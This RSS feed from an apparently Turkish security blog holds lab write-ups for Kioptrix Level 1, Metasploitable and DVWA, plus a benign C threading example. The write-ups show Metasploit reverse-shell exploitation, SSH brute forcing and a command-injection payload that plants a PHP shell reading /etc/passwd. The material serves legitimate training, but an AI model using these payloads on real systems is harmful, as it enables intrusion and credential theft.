<?xml version="1.0"?>
<rss version="2.0" xmlns:atom="http://www.w3.org/2005/Atom">
  <channel>
    <title></title>
    <link>http://localhost:4000</link>
    <atom:link href="http://localhost:4000/feed.xml" rel="self" type="application/rss+xml" />
    <description></description>
    <language>en-us</language>
    <pubDate>Wed, 26 Apr 2017 13:42:20 +0300</pubDate>
    <lastBuildDate>Wed, 26 Apr 2017 13:42:20 +0300</lastBuildDate>

    
      <item>
        <title>Kioptrix Level 1 Çözüm</title>
        <link>http://localhost:4000/kioptrix-level-1</link>
        <pubDate>Wed, 26 Apr 2017 00:00:00 +0300</pubDate>
        <author></author>
        <description>&lt;p&gt;      &lt;strong&gt;Kioptrix&lt;/strong&gt;, içerisindeki çeşitli zafiyetleri istismar ettiğimiz, bunlar sayesinde erişimler elde 
edebildiğimiz ve bu şekilde sistemi ele geçirmeye çalıştığımız bir sanal makine uygulamasıdır.
Bu yazımızda Kioptrix &lt;strong&gt;Level 1&lt;/strong&gt; sanal makinesi çözümünü yapacağız. Sanal makineyi &lt;a href=&quot;http://www.kioptrix.com/blog/test-page/&quot;&gt;şu&lt;/a&gt; bağlantı 
üzerinden indirebilirsiniz.&lt;/p&gt;

&lt;p&gt;      Öncelikle sanal makinenın ağ üzerinde hangi ip adresini aldığını öğrenmek için &lt;strong&gt;nmap&lt;/strong&gt; aracıyla
genel bir ağ taraması yapıyoruz.&lt;/p&gt;

&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;nmap -sV -T4 192.168.0.0/24
&lt;/code&gt;&lt;/pre&gt;
&lt;/div&gt;

&lt;p&gt;&lt;img src=&quot;/img/kioptrix/hedef-tespiti.png&quot; /&gt;&lt;/p&gt;

&lt;p&gt;      Bu ağ taraması sonucuna göre Kioptrix Level 1 sanal makinasının aldığı ip adresi 192.168.0.22 olarak
görünüyor. Bu bilgiyi kullanarak şimdi açık portları tespit etmek için başka bir tarama yapacağız.&lt;/p&gt;

&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;nmap -sV -T4 192.168.0.22 --open
&lt;/code&gt;&lt;/pre&gt;
&lt;/div&gt;

&lt;p&gt;&lt;img src=&quot;/img/kioptrix/hedef-tarama.png&quot; /&gt;&lt;/p&gt;

&lt;p&gt;      Bu işlem sonucunda açık olan portları aşağıdaki gibi listeliyoruz.  &lt;strong&gt;Netbios-ssn&lt;/strong&gt; servisi
üzerinden işlem yapmaya çalışacağız. Burada sambanın bu sürümünde bulunan &lt;strong&gt;arabellek taşması(buffer overflow)&lt;/strong&gt;
açığı istismar edilecektir.&lt;/p&gt;

&lt;table&gt;
  &lt;tbody&gt;
    &lt;tr&gt;
      &lt;td&gt;139/tcp&lt;/td&gt;
      &lt;td&gt;open&lt;/td&gt;
      &lt;td&gt;netbios-ssn&lt;/td&gt;
      &lt;td&gt;Samba smbd (workgroup: MYGROUP)&lt;/td&gt;
    &lt;/tr&gt;
  &lt;/tbody&gt;
&lt;/table&gt;

&lt;p&gt;      &lt;strong&gt;Metasploit Framework&lt;/strong&gt; üzerinde &lt;strong&gt;exploit&lt;/strong&gt; aramaya başlıyoruz.&lt;/p&gt;

&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;msf&amp;gt; search samba
&lt;/code&gt;&lt;/pre&gt;
&lt;/div&gt;

&lt;p&gt;&lt;img src=&quot;/img/kioptrix/search-exploit.jpeg&quot; /&gt;&lt;/p&gt;

&lt;p&gt;      Burada listelenen çözümlerden sistemimiz ile ilgili olan seçiyoruz.&lt;/p&gt;

&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;msf&amp;gt;  use exploit/linux/samba/trans2open
&lt;/code&gt;&lt;/pre&gt;
&lt;/div&gt;

&lt;p&gt;      Bu aşamada kullandığımız exploit sayesinde samba servisi açığından yararlanabiliyoruz fakat
hedef sistem üzerinde bir kontrol elde edemiyoruz. Burada hedef sisteme sızmayı sağlayan ve 
istediğimiz işlemleri gerçekleştirmemizi sağlayan &lt;strong&gt;payload&lt;/strong&gt;lardan birini kullanmamız gerekiyor.
Uygun olabilecek payloadları aratıyoruz ve buradan &lt;strong&gt;reverse_tcp&lt;/strong&gt; seçimini yapıp hedefe karşı bir
reverse shell uygulaması yapacağız. Hedefin tepkisi sonucu terminalden bir reverse shell bağlantısı
kurulacak. Sonrasında eklememiz gereken parametreleri görmek ve eklemek için aşağıdaki adımları
uyguluyoruz.&lt;/p&gt;

&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;msf&amp;gt; show payloads
msf&amp;gt; set PAYLOAD generic/shell_reverse_tcp
msf&amp;gt; options
msf&amp;gt; set RHOST 192.168.0.18
msf&amp;gt; set LHOST 192.168.0.14
msf&amp;gt; run
&lt;/code&gt;&lt;/pre&gt;
&lt;/div&gt;

&lt;p&gt;&lt;img src=&quot;/img/kioptrix/search-payload.jpeg&quot; /&gt;&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/img/kioptrix/options.jpeg&quot; /&gt;&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/img/kioptrix/root-erisim.jpeg&quot; /&gt;&lt;/p&gt;

&lt;p&gt;      Belli bir süre devam eden işlem sonucunda hedefe root erişimi sağlıyoruz. Artık içeride 
bulunmak istenen mesajı aramaya başlıyoruz. Önemli gördüğümüz dizinler arasında dolanırken
gözümüze &lt;strong&gt;var&lt;/strong&gt; dizini takılıyor . Buraya girdiğmizde &lt;strong&gt;mail&lt;/strong&gt; adlı bir dosya daha görüyoruz. Bunun da
içerisine girdiğmizde dosya tipi &lt;strong&gt;ASCII mail text&lt;/strong&gt; olan ‘&lt;strong&gt;root&lt;/strong&gt;’ adlı bir dosya görüyoruz. Bunu 
okuduğumuzda bu  makinenin &lt;strong&gt;FLAG&lt;/strong&gt; değerine ulaşıyoruz.&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/img/kioptrix/sonuc1.jpeg&quot; /&gt;
&lt;img src=&quot;/img/kioptrix/sonuc2.jpeg&quot; /&gt;&lt;/p&gt;

</description>
      </item>
    
      <item>
        <title>Thread-MultiThreading Örneği (C)</title>
        <link>http://localhost:4000/multi-threads-example</link>
        <pubDate>Fri, 21 Apr 2017 00:00:00 +0300</pubDate>
        <author></author>
        <description>&lt;h4&gt;Thread nedir ?&lt;/h4&gt;

&lt;p&gt;      Sistemimizde çalışan her programa process(&lt;strong&gt;süreç&lt;/strong&gt;) denir. Bu process’ler
de kendi içerisinde dallanıp &lt;strong&gt;alt süreçler&lt;/strong&gt;i oluşturabilir. Bu alt süreçler aynı anda çalışabilir ve aynı kaynakları kullanabilir. Eş zamanlı çalışmaya yardımcı olan ve aynı process’in işlerini yürüten bu süreçlere &lt;strong&gt;Thread&lt;/strong&gt; denir.&lt;/p&gt;

&lt;p&gt;      Bu yazımızda &lt;strong&gt;C&lt;/strong&gt; programlama diliyle yazdığımız bir &lt;strong&gt;thread&lt;/strong&gt; örneğini inceleyeceğiz. Programımız
temel işlev olarak herhangi bir text dosyası içerisinde istenen kelimenin olup olmadığını
kontrol ediyor ve buna göre bir sonuç dönüyor. Fonksiyonumuz normalde tek bir dosya içerisinde arama 
yapacakken thread kullanarak birden fazla dosya için arama mekanizması oluşturduk. Oluşacak thread
sayımızı , okunacak dosya sayısı kadar belirliyoruz ve oluşturduğumuz fonksiyonu bu threadlerle
bağlıyoruz.&lt;/p&gt;

&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;pthread_create(&amp;amp;tid[sayac], NULL, &amp;amp;arama, (void *)kelime);
&lt;/code&gt;&lt;/pre&gt;
&lt;/div&gt;

&lt;p&gt;      Bu Kodu yazarak threadi oluşturup fonksiyon ile ilişkilendiriyoruz. Bundan sonra thread oluştukça bu
fonksiyona gidecek. Fonksiyona gidiyor ve yanında parametre olarak aldığı &lt;strong&gt;aranan kelimeyi&lt;/strong&gt; de götürüyor. &lt;strong&gt;input_sayisi&lt;/strong&gt; değişkeni okunan dosya sayisini temsil ediyor. İlk başta değeri ‘&lt;strong&gt;0&lt;/strong&gt;’
olduğu için önce belirlediğimiz text dosyalarından birincisine gidiyor. Burada string kütüphanesi 
fonksiyonlarından  ‘&lt;strong&gt;strstr&lt;/strong&gt;’ kullandık ve  bu sayede arama işlemini gerçekleştirdik.  Burada tuttuğumuz
&lt;strong&gt;kontrol&lt;/strong&gt; değişkeni ,aranan kelimenin bulunma durumunu simgeliyor. Eğer aradığımız kelime içeride 
varsa bu değişkeni &lt;strong&gt;1&lt;/strong&gt;, yoksa &lt;strong&gt;2&lt;/strong&gt; yapıyoruz. Bu sayede ana fonksiyon üzerinde bu kontrolden yola çıkarak
sonucu göstereceğiz. Burada okunan dosya sayısını da &lt;strong&gt;dosya_sayisi&lt;/strong&gt; değişkeni ile tutuyoruz , bunu da 
input dosyalarımızı isimlendirirken kullanacağız. Programımız bu işlemleri oluşturulacak thread 
sayisi, yani dosya sayisi kadar tekrarlayacaktır.&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/img/thread/compile.png&quot; /&gt;
&lt;img src=&quot;/img/thread/result.png&quot; /&gt;&lt;/p&gt;

&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;#include&amp;lt;pthread.h&amp;gt;
#include&amp;lt;stdio.h&amp;gt;
#include&amp;lt;string.h&amp;gt;
#include&amp;lt;stdlib.h&amp;gt;
#include&amp;lt;unistd.h&amp;gt;

void* arama();
int kontrol;
int dosya_sayisi;

int main()
{

system(&quot;clear&quot;);
char kelime[100];
int sayac=0;
int thread_sayisi;
int thread;

printf(&quot;File #? &quot;);
scanf(&quot;%d&quot;,&amp;amp;thread_sayisi);

thread_sayisi=thread_sayisi+1;
pthread_t tid[thread_sayisi];

printf(&quot;Word? &quot;);
scanf(&quot;%s&quot;,kelime);

while(sayac&amp;lt;thread_sayisi)
{

thread = pthread_create(&amp;amp;tid[sayac], NULL, &amp;amp;arama, (void *)kelime);

if (thread != 0)
{

printf(&quot;\nThread olusturulamadi  :[%s]&quot;, strerror(thread));
}

else
{
//	  printf(&quot;\n %d Thread oluştu...\n&quot;,&amp;amp;tid[count]);

if(kontrol==1)
{
printf(&quot;inputThread%d.txt -&amp;gt; &quot;,dosya_sayisi);
printf(&quot;true\n&quot;);

}

if(kontrol==2)
{
printf(&quot;inputThread%d.txt -&amp;gt; &quot;,dosya_sayisi);
printf(&quot;false\n&quot;);

}


}

pthread_join(tid[sayac],NULL);
sayac++;


}

sleep(5);
return 0;




}

int input_sayisi = 0;
char *fname1 = &quot;inputThread1.txt&quot;;
char *fname2 = &quot;inputThread2.txt&quot;;
char *fname3 = &quot;inputThread3.txt&quot;;
char *fname4 = &quot;inputThread4.txt&quot;;
char *fname5 = &quot;inputThread5.txt&quot;;


void *arama(char *kelime) 
{




FILE *fp;

int find_result = 0;

char temp[512];




if(input_sayisi==0 &amp;amp;&amp;amp;(fp = fopen(fname1, &quot;r&quot;)) == NULL) {

return 0;

}

if(input_sayisi==1 &amp;amp;&amp;amp;(fp = fopen(fname2, &quot;r&quot;)) == NULL) {

return 0;

}

if(input_sayisi==2 &amp;amp;&amp;amp;(fp = fopen(fname3, &quot;r&quot;)) == NULL) {

return 0;

}

if(input_sayisi==3 &amp;amp;&amp;amp;(fp = fopen(fname4, &quot;r&quot;)) == NULL) {

return 0;

}

if(input_sayisi==4 &amp;amp;&amp;amp;(fp = fopen(fname5, &quot;r&quot;)) == NULL) {

return 0;

}

if(input_sayisi==5)

{

return ;

}

input_sayisi++;



while(fgets(temp, 512, fp) != NULL) {

if((strstr(temp, kelime)) != NULL) {

find_result++;
kontrol =1 ;
dosya_sayisi++;

}


}


if(find_result == 0) {

kontrol = 2;
dosya_sayisi++;
}


if(fp) {

fclose(fp);

}



}
&lt;/code&gt;&lt;/pre&gt;
&lt;/div&gt;

</description>
      </item>
    
      <item>
        <title>Exploitation'a Giriş (Uygulama)</title>
        <link>http://localhost:4000/exploitation-giris</link>
        <pubDate>Tue, 18 Apr 2017 00:00:00 +0300</pubDate>
        <author></author>
        <description>&lt;h4&gt;Exploit nedir ?&lt;/h4&gt;

&lt;p&gt;      Hedefteki belli zafiyetleri kullanarak yetki yükseltme, hedefe erişim
sağlama , hedef üzerinde çeşitli işlemleri gerçekleştirmek amacıyla 
oluşturulmuş araçlardır. Araçlar diyoruz çünkü bunlar sadece yazılımsal
olmak zorunda değillerdir. Çeşitli amaçlarla üretilen &lt;strong&gt;cihazlar&lt;/strong&gt; veya &lt;strong&gt;sosyal
mühendislik&lt;/strong&gt; durumları da birer exploit davranışı sergileyebilir.&lt;/p&gt;

&lt;h4&gt;Metasploit nedir ?&lt;/h4&gt;

&lt;p&gt;      Metasploit &lt;strong&gt;open-source&lt;/strong&gt; bir exploit framework’tür.  İçerisinde hazır
exploitleri ,zararlı kod parçalarını bulundurur. Bir sistemde zafiyet tespit
ettikten sonra buradan ilgili exploiti kullanarak sistem üzerinde 
yapmayı amaçladığımız işleri gerçekleştirebiliriz.&lt;/p&gt;

&lt;h4&gt;Metasploitable nedir ? &lt;/h4&gt;

&lt;p&gt;      Metasploitable , içerisinde bilinçli olarak belli zafiyetler 
barındıran bir linux işletim sistemidir. Bu sistem sızma testleri 
çalışmalarında ve uygulamalarında kullanılır ve exploit edilmeye
çalışılır.&lt;/p&gt;

&lt;h3&gt;Metasploitable - Uygulama 1 &lt;/h3&gt;

&lt;p&gt;      Metasploitable’ ı &lt;strong&gt;VMware&lt;/strong&gt; sanal makinesinde kurduktan sonra ana cihazımızda 
metasploitable için  bir port taraması yapıyoruz. Öncelikle bunu 
yapabilmek için ip adresini bilmemiz gerekiyor. Bunu genel ağ taraması
ile de yapabiliriz. Bu uzun sürecektir. Daha kısa bir şekilde 
metasploitable üzerinde&lt;/p&gt;

&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;ifconfig
&lt;/code&gt;&lt;/pre&gt;
&lt;/div&gt;

&lt;p&gt;yazarak ip adresini öğrenebiliriz. 
Sonrasında ana cihaz üzerinde&lt;/p&gt;

&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;nmap -sV -T4 192.168.164.128 --open
&lt;/code&gt;&lt;/pre&gt;
&lt;/div&gt;

&lt;p&gt;yazarak metasploitable üzerindeki açık portları listeleyebiliriz.&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/img/metasploitable/nmap-taramasi.png&quot; /&gt;&lt;/p&gt;

&lt;p&gt;      Burada&lt;/p&gt;

&lt;table&gt;
  &lt;tbody&gt;
    &lt;tr&gt;
      &lt;td&gt;21/tcp&lt;/td&gt;
      &lt;td&gt;open&lt;/td&gt;
      &lt;td&gt;ftp&lt;/td&gt;
      &lt;td&gt;vsftpd 2.3.4&lt;/td&gt;
    &lt;/tr&gt;
  &lt;/tbody&gt;
&lt;/table&gt;

&lt;p&gt;kısmını görüyoruz ve buradan açık olan &lt;strong&gt;ftp&lt;/strong&gt; portu için metasploit’te uygun exploit araması yapıyoruz.
Bulduğumuz exploiti seçiyoruz.&lt;/p&gt;

&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;msf&amp;gt; search vsftpd
msf&amp;gt; use exploit/unix/ftp/vsftpd_234_backdoor
&lt;/code&gt;&lt;/pre&gt;
&lt;/div&gt;

&lt;p&gt;&lt;img src=&quot;/img/metasploitable/vsftpd-search.png&quot; /&gt;&lt;/p&gt;

&lt;p&gt;      Exploit için gerekli parametreleri görmek için aşağıdaki komutu giriyoruz.&lt;/p&gt;

&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;msf&amp;gt; options
&lt;/code&gt;&lt;/pre&gt;
&lt;/div&gt;

&lt;p&gt;      Burada ‘Required’ = yes olan kısımlar girilmesi gerekli parametleri gösterir. &lt;strong&gt;RPORT&lt;/strong&gt; için current
değerimiz 21 olarak kalabilir. &lt;strong&gt;RHOST&lt;/strong&gt; için henüz girilmiş bir değer yok bunu da ;&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/img/metasploitable/vsftpd-options.png&quot; /&gt;&lt;/p&gt;

&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;msf&amp;gt; set RHOST 192.168.164.128
&lt;/code&gt;&lt;/pre&gt;
&lt;/div&gt;

&lt;p&gt;olarak giriyoruz ve artık exploitimiz hazır durumda.&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/img/metasploitable/vsftpd-run.png&quot; /&gt;&lt;/p&gt;

&lt;p&gt;      Hedefin komut satırı artık elimizde ,buradan amaçlarımız doğrultusunda komutlar çalıştırarak 
çeşitli işlemler yapabiliriz.&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/img/metasploitable/vsftpd-sonuc.png&quot; /&gt;&lt;/p&gt;

&lt;h3&gt;Metasploitable - Uygulama 2 &lt;/h3&gt;

&lt;p&gt;      Yine port taramasından çıkan sonuca göre ;&lt;/p&gt;

&lt;table&gt;
  &lt;tbody&gt;
    &lt;tr&gt;
      &lt;td&gt;22/tcp&lt;/td&gt;
      &lt;td&gt;open&lt;/td&gt;
      &lt;td&gt;ssh&lt;/td&gt;
      &lt;td&gt;OpenSSH 4.7p1 Debian 8ubuntu1 (protocol 2.0)&lt;/td&gt;
    &lt;/tr&gt;
  &lt;/tbody&gt;
&lt;/table&gt;

&lt;p&gt;sonucunu görüyoruz. Buradan uygun exploit ile &lt;strong&gt;brute force&lt;/strong&gt; yaparak ssh bağlantısı kurmaya çalışacağız. Anahtar kelimemizi ssh_login olarak belirleyip aratıyoruz.&lt;/p&gt;

&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;msf&amp;gt; search ssh_login
&lt;/code&gt;&lt;/pre&gt;
&lt;/div&gt;

&lt;p&gt;      Burada auxilary ve exploitler birlikte listelendi . &lt;strong&gt;Auxilary&lt;/strong&gt;‘ler sistem ele geçirilmeden önce 
bilgi toplama ,analiz etme gibi amaçlarla kullanılır ama bazen birer exploit görevi de görebilir.&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/img/metasploitable/ssh-search.png&quot; /&gt;&lt;/p&gt;

&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;msf&amp;gt; use auxiliary/scanner/ssh/ssh_login
&lt;/code&gt;&lt;/pre&gt;
&lt;/div&gt;

&lt;p&gt;komutunu giriyoruz ve parametrelerini hazırlamaya başlıyoruz.&lt;/p&gt;

&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;msf&amp;gt; options 
&lt;/code&gt;&lt;/pre&gt;
&lt;/div&gt;

&lt;p&gt;yaptıktan sonra RHOSTS gerekli bir parametre olduğunu görüyoruz ve ;&lt;/p&gt;

&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;msf&amp;gt; set RHOSTS 192.168.164.128
&lt;/code&gt;&lt;/pre&gt;
&lt;/div&gt;

&lt;p&gt;yaptıktan sonra brute-force atağında kullanılmak üzere wordlistimizi de veriyoruz.&lt;/p&gt;

&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;msf&amp;gt; set USERPASS_FILE /usr/share/metasploit-framework/data/wordlists/root_userpass.txt

msf&amp;gt; run 
&lt;/code&gt;&lt;/pre&gt;
&lt;/div&gt;

&lt;p&gt;dedikten sonra ssh bağlantısı bilgilerini ele geçiriyoruz ve artık bağlantı kurabiliriz.&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/img/metasploitable/ssh-sonuc.png&quot; /&gt;&lt;/p&gt;

&lt;p&gt;&lt;br /&gt;&lt;/p&gt;

&lt;p&gt;      Böylelikle &lt;strong&gt;Metasploitable&lt;/strong&gt; üzerinde bulduğumuz zafiyetlerden yararlanarak sızma uygulaması gerçekleştirmiş olduk. Önce sistem üzerinde olası zafiyetleri belirlemek için bilgi toplama aşaması gerçekleştirdik . Sonrasında bu bilgiler ışığında kullanılabilecek zafiyetleri tespit ettik ve &lt;strong&gt;Metasploit Framework&lt;/strong&gt; üzerinden uygun exploitleri seçerek sisteme erişmeye çalıştık.&lt;/p&gt;

</description>
      </item>
    
      <item>
        <title>DVWA (Low-Level) Çözümleri</title>
        <link>http://localhost:4000/dvwa-cozumler-low-level</link>
        <pubDate>Mon, 27 Mar 2017 00:00:00 +0300</pubDate>
        <author></author>
        <description>&lt;p&gt;      Damn Vulnerable Web App &lt;strong&gt;(DVWA)&lt;/strong&gt;, savunmasız olan bir PHP / MySQL web uygulamasıdır. Ana hedefleri, güvenlik uzmanlarının yasal ortamda becerilerini ve araçlarını test etmelerine, web geliştiricilerinin web uygulamalarını güvence altına alma süreçlerini daha iyi anlamalarına ve öğretmenlerin / öğrencilerin sınıf ortamında web uygulaması güvenliğini öğrenmesine / öğretmesine yardımcı olmalarına yardımcı olmaktır .&lt;/p&gt;

&lt;p&gt;      GNU/Linux makinanıza DVWA kurulumu için gereken adımları aşağıda listeledik.&lt;/p&gt;

&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;1. nano dvwa/config/config.inc.php

_DVWA[ 'db_password' ] = 'sizin_sifeniz'; 

2. nano /etc/php/7.0/apache2/php.ini

allow_url_include = Off --&amp;gt; On      //olarak değiştiriyoruz.

3. chmod -R 777 /var/www/html/dvwa  //Dosya İzini veriyoruz.

4. create database dvwa;          //Veri tabanı oluşturuyoruz. 

5. nano /etc/apache2/apache2.conf   //Dosyasına giderek an alt satıra 'ServerName localhost' 

ekliyoruz

6. /etc/init.d/apache2 start

7. /etc/init.d/mysql start

8. localhost/dvwa/setup.php          //Tarayıcıdan bu adrese giderek başlayabiliriz.
&lt;/code&gt;&lt;/pre&gt;
&lt;/div&gt;

&lt;h4&gt;Brute Force&lt;/h4&gt;

&lt;p&gt;      Burada &lt;strong&gt;Burp Suite&lt;/strong&gt; aracını kullanarak parametreler yakalayacağız ve bu parametrelere kelimelere gönderip kırmaya çalışacağız. Önce Burp Suite ile tarayıcımızı senkronize çalışır hale getirmek için aşağıdaki adımları izliyoruz.&lt;/p&gt;

&lt;p&gt;      Tarayıcıdan &lt;strong&gt;Preferences -&amp;gt; Advanced -&amp;gt; Network -&amp;gt; Settings&lt;/strong&gt; bölümüne geliyoruz. Burada Manual proxy configuration kısmını işaretleyip
&lt;strong&gt;HTTP Proxy : 127.0.0.1 , Port : herhangi birşey&lt;/strong&gt; yapıp  geri kalan herşeyi boş bırakıyoruz.&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/img/brute-force/mozilla-proxy.png&quot; /&gt;&lt;/p&gt;

&lt;p&gt;      Sonra Burp başlatıp Proxy Bölümüne geliyoruz. Buradan da &lt;strong&gt;Options&lt;/strong&gt; bölümüne gelerek &lt;strong&gt;Proxy Listener&lt;/strong&gt; sekmesine yeni bir ekleme yapıyoruz . &lt;strong&gt;Interface : 127.0.0.1 Port : 7777&lt;/strong&gt; .
Bundan sonra Burp ile tarayıcımız senkronize çalışacak.&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/img/brute-force/burp-add-proxy.png&quot; /&gt;&lt;/p&gt;

&lt;p&gt;      Sonra &lt;strong&gt;Intercept&lt;/strong&gt; kısmına geliyoruz. Intercept ON ‘a tıklayıp tarayıcıdan Brute Force  kısmına giriş yapmak için bir şeyler yazıp submit 
ediyoruz. Bu olurken BURP’ te birtakım değişiklikler olduğunu görüyoruz.&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/img/brute-force/catch-info.png&quot; /&gt;&lt;/p&gt;

&lt;p&gt;      &lt;strong&gt;GET&lt;/strong&gt; sonucunu aldıktan sonra gelen bütün datayı seçip &lt;strong&gt;INTRUDER&lt;/strong&gt; bölümüne gönderiyoruz. 
Orada ‘$’ işaretlerini temizliyoruz. USERNAME ve PASSWORD kısmındakiler kalıyor. 
Çünkü değiştirip wordlist saldirisi şeklinde bu değişkenleri yollayacağız. Oturum bilgisi ve diğer değişkenler sabit kalacak.&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/img/brute-force/parameters.png&quot; /&gt;&lt;/p&gt;

&lt;p&gt;      Sonrasında aynı sayfada atak tipini &lt;strong&gt;‘Cluster Bomb’&lt;/strong&gt; olarak değiştiriyoruz. Sonra &lt;strong&gt;Payloads&lt;/strong&gt; Bölümüne gelip ‘Payload Set =1’ yapıyoruz. Önce username için yollayacağımız kelimeleri
bu payload set altına dolduruyoruz. Sonrasında ‘Payload Set =2’ yapıp burada da password için 
yollayacağımız  kelimeleri ekliyoruz. Sonrasında ‘Options’ bölümüne geliyoruz. Burada 
&lt;strong&gt;‘Grep-Match’&lt;/strong&gt; kısmına sonucumuz doğru olduğu takdirde dönen değerin ne olacağı tahmini yapmamız gerekiyor. Eşleştiğinde username ve password değerlerimizin doğru olduğunu anlarız.&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/img/brute-force/result.png&quot; /&gt;&lt;/p&gt;

&lt;h4&gt;Command Injection&lt;/h4&gt;

&lt;p&gt;      Önce ping için istedeği ip adresini verdikten sonra şöyle yazarak :&lt;/p&gt;

&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;1. 127.0.0.1 &amp;amp;&amp;amp; echo &quot;Ctr1l&quot; 
&lt;/code&gt;&lt;/pre&gt;
&lt;/div&gt;

&lt;p&gt;ping işlemlerinin altında yazdığımız komutun sonucunu görüyoruz. Buradan 
“Command Injection” yapılabildiğini anlıyoruz.Devamında&lt;/p&gt;

&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;1. 192.168.0.1 &amp;amp;&amp;amp; echo &quot;&amp;lt;?php echo shell_exec('cat /etc/passwd')  ?&amp;gt;&quot; &amp;gt;&amp;gt; test.php
2. http://localhost/DVWA-master/vulnerabilities/exec/test.php
&lt;/code&gt;&lt;/pre&gt;
&lt;/div&gt;

&lt;p&gt;      &lt;strong&gt;Passwd&lt;/strong&gt; dosyasını ekrana bastıracak bir PHP kodu yazdık ve bunu içeriye test.php olarak yolladık. Bu sayfaya gittiğimizde passwd dosyasının içeriğini görüyoruz.&lt;/p&gt;

&lt;h4&gt;CSRF&lt;/h4&gt;

&lt;p&gt;      Kaynağı görüntüleyip şifre değiştirme formunu alıyoruz. Buraya göndermek istediğmiz datayı &lt;strong&gt;‘value’&lt;/strong&gt; olarak kodumuza ekliyoruz. Sonra bu verilerin nereye gideceğini belirtmemiz gerekiyor. Bunu da “http://localhost/DVWA-master/vulnerabilities/csrf/?”   olarak görüyoruz ve &lt;strong&gt;#&lt;/strong&gt; kısmını buna göre düzenliyoruz.&lt;/p&gt;

&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;nt&quot;&gt;&amp;lt;html&amp;gt;&lt;/span&gt;


&lt;span class=&quot;nt&quot;&gt;&amp;lt;form&lt;/span&gt; &lt;span class=&quot;na&quot;&gt;action=&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;http://localhost/DVWA-master/vulnerabilities/csrf/?&quot;&lt;/span&gt; &lt;span class=&quot;na&quot;&gt;method=&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;GET&quot;&lt;/span&gt;&lt;span class=&quot;nt&quot;&gt;&amp;gt;&lt;/span&gt;
New password:&lt;span class=&quot;nt&quot;&gt;&amp;lt;br&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;/&amp;gt;&lt;/span&gt;
&lt;span class=&quot;nt&quot;&gt;&amp;lt;input&lt;/span&gt; &lt;span class=&quot;na&quot;&gt;type=&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;password&quot;&lt;/span&gt; &lt;span class=&quot;na&quot;&gt;AUTOCOMPLETE=&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;off&quot;&lt;/span&gt; &lt;span class=&quot;na&quot;&gt;name=&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;password_new&quot;&lt;/span&gt; &lt;span class=&quot;na&quot;&gt;value=&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;ctr1l&quot;&lt;/span&gt;&lt;span class=&quot;nt&quot;&gt;&amp;gt;&amp;lt;br&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;/&amp;gt;&lt;/span&gt;
Confirm new password:&lt;span class=&quot;nt&quot;&gt;&amp;lt;br&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;/&amp;gt;&lt;/span&gt;
